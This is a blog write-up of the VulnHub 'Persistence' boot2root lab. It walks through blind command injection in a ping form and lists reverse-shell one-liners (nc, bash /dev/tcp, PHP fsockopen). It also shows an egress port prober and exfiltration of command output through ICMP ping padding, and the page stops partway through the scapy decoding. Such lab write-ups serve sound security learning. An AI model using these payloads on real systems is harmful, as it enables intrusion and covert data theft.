
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>#!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="persist we must! Persistence! A new boot2root hosted @VulnHub, authored by @superkojiman and sagi- definitely got the attention from the community it &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-09-18T06:58:53+02:00" pubdate data-updated="true">Sep 18<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>persist we must!</h2>

<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>

<blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote>


<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>

<h2>lets get our hands dirty</h2>

<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>

<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>

<figure class='code'><figcaption><span>First Persistence Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 07:01 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4131.90 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>

<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>

<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>

<figure class='code'><figcaption><span>PHP reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v 192.168.56.104/index.php
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.104 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.104...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.104 <span class="o">(</span>192.168.56.104<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /index.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.104
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 404 Not Found
</span><span class='line'>&lt; Server: nginx/1.4.7
</span><span class='line'>&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
</span><span class='line'>&lt; Content-Type: text/html
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Connection: keep-alive
</span><span class='line'>&lt; X-Powered-By: PHP/5.3.3
</span><span class='line'>
</span><span class='line'>No input file specified.
</span><span class='line'>
</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.104 left intact</span>
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>

<h2>finding that (de)bugger</h2>

<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>

<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>

<figure class='code'><figcaption><span>discovering debug.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.104/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">1660</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00434:  <span class="nv">C</span><span class="o">=</span>200     12 L        28 W      357 Ch    <span class="s2">&quot; - debug&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>

<p><img src="https://i.imgur.com/neKe18e.png"></p>

<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>

<h2>blind command injection</h2>

<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>

<figure class='code'><figcaption><span>ping test</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 1, length 64
</span><span class='line'>07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 1, length 64
</span><span class='line'>07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 2, length 64
</span><span class='line'>07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 2, length 64
</span><span class='line'>07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 3, length 64
</span><span class='line'>07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 3, length 64
</span><span class='line'>07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 4, length 64
</span><span class='line'>07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 4, length 64
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>

<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>

<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>

<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>

<h2>blind command injection &ndash; file enumeration</h2>

<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>

<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>

<figure class='code'><figcaption><span>File existence check payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span><span class="k">if</span> <span class="o">[</span> -f /bin/sh <span class="o">]</span> <span class="p">;</span> <span class="k">then </span>ping 192.168.56.102 -c 1 <span class="p">;</span> <span class="k">else </span>ping 192.168.56.102 -c 2 <span class="p">;</span> <span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>

<figure class='code'><figcaption><span>File existence response</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 63493, seq 1, length 64
</span><span class='line'>08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 63493, seq 1, length 64
</span></code></pre></td></tr></table></div></figure>


<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>

<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>

<h2>blind command injection &ndash; port scanner</h2>

<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>

<p>No. Luck.</p>

<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>

<figure class='code'><figcaption><span>probe.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="s">&quot;192.168.56.102&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>

<h2>data exfiltration</h2>

<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>

<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>

<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>

<figure class='code'><figcaption><span>ping patterns</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-p pattern
</span><span class='line'>   You may specify up to 16 <span class="sb">``</span>pad<span class="s1">&#39;&#39;</span> bytes to fill out the packet you send.
</span><span class='line'>   This is useful <span class="k">for </span>diagnosing data-dependent problems in a network.
</span><span class='line'>   For example, <span class="sb">``</span>-p ff<span class="s1">&#39;&#39;</span> will cause the sent packet to be filled with all ones.
</span></code></pre></td></tr></table></div></figure>


<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>

<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>id<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the <code>tcpdump</code> side of things&hellip;</p>

<figure class='code'><figcaption><span>Ping pattern tcpdump</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop# tcpdump icmp -X
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span><span class='line'>09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span></code></pre></td></tr></table></div></figure>


<p>Mind. Blown.</p>

<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>

<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>

<figure class='code'><figcaption><span>Scapy sniff()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;icmp[icmptype] == 8 and host 192.168.56.104&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span>
</span><span class='line'>   <span class="n">ginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">n</span>
